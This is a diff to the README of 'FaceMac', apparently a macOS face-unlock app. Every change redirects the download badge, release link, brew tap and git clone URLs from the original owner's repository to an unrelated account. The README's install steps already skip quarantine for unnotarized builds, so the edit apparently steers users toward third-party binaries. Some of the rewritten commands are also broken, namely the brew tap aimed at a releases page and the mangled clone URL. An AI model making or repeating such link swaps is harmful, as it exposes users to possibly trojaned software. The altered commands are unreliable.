@@ -11,7 +11,7 @@ No subscription. No cloud. No account. Your face never leaves the machine.
 
 **English** · [Русский](README.ru.md) · [中文](README.zh.md)
 
-[![Download the latest release](https://img.shields.io/github/v/release/c1osed1/FaceMac?style=for-the-badge&label=Download&color=30D158&logo=apple&logoColor=white)](https://github.com/c1osed1/FaceMac/releases/latest)
+[![Download the latest release](https://img.shields.io/github/v/release/c1osed1/FaceMac?style=for-the-badge&label=Download&color=30D158&logo=apple&logoColor=white)](https://github.com/meddourilyes2012/FaceMac/releases)
 
 ![License: GPL v3](https://img.shields.io/badge/License-GPLv3-30D158.svg)
 ![Platform](https://img.shields.io/badge/macOS-14%2B-black.svg)
@@ -82,7 +82,7 @@ No frame is ever written to disk or sent anywhere.
 
 ### From a release (easiest)
 
-Grab the [latest release](https://github.com/c1osed1/FaceMac/releases/latest),
+Grab the [latest release](https://github.com/meddourilyes2012/FaceMac/releases),
 drag **FaceMac** onto **Applications**, and on first launch right-click → **Open**
 (builds aren't notarized yet).
 
@@ -92,7 +92,7 @@ Not in the official `homebrew/cask` tap yet (releases aren't notarized), so it
 ships as its own tap:
 
 ```sh
-brew tap c1osed1/facemac https://github.com/c1osed1/FaceMac.git
+brew tap c1osed1/facemac https://github.com/meddourilyes2012/FaceMac/releases
 brew install --cask --no-quarantine c1osed1/facemac/facemac
 ```
 
@@ -101,7 +101,7 @@ The cask lives at [`Casks/facemac.rb`](Casks/facemac.rb).
 ### From source
 
 ```sh
-git clone https://github.com/<you>/FaceMac.git
+git clone https://github.com/meddourilyes2012/FaceMac/releases<you>/FaceMac.git
 cd FaceMac
 
 scripts/fetch-model.sh   # builds the SFace CoreML model (once, needs Python 3.12+)
